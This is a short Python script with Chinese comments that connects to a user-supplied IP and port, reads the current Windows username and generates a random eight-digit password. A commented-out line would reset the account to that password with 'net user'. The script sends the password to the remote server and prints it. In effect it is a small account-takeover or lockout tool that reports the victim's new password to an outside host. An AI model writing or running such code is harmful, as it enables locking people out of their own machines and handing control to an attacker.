import socket 
import getpass
import subprocess
import random


# 创建socket实例
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = input("输入IP地址:")
post = input("输入端口:")
# 连接server端
client.connect((ip, int(post)))
user = getpass.getuser()
psd = ''
for j in range(1, 9):
    m = str(random.randrange(0, 10))
    psd = psd + m
# 修改密码
# subprocess.Popen(['net', 'User', user, psd])
# 发送数据给server
client.send(psd.encode('utf-8'))
back_msg = client.recv(1024)
client.close()
print(psd)
